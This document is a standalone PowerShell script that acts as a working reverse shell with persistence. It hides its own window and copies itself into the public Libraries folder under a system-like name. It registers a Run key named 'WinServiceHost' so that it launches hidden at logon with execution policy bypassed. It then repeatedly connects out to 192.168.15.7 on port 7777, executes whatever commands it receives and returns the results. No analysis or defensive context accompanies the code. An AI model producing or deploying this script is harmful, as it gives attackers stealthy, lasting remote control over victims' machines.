$t = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
add-type -name win -member $t -namespace native
[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0)
Set-Variable -Name f -Value ($env:PUBLIC+'\Libraries\win-sys-64.ps1');if(-not(Test-Path $f)){$c=$MyInvocation.MyCommand.Definition;if($c){Copy-Item $c -Destination $f};reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WinServiceHost" /t REG_SZ /d "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File \"$f\"" /f};while($true){try{Set-Variable -Name cc -Value (New-Object System.Net.Sockets.TCPClient('192.168.15.7',7777));Set-Variable -Name s -Value ($cc.GetStream());Set-Variable -Name r -Value (New-Object System.IO.StreamReader($s));Set-Variable -Name w -Value (New-Object System.IO.StreamWriter($s));$w.AutoFlush=$true;while($cc.Connected){$w.Write('PS '+(pwd).Path+'> ');Set-Variable -Name cmd -Value ($r.ReadLine());if($cmd -eq 'exit'){$cc.Close();break};Set-Variable -Name out -Value (iex $cmd 2>&1|Out-String);$w.WriteLine($out)}}catch{Start-Sleep -Seconds 10}}
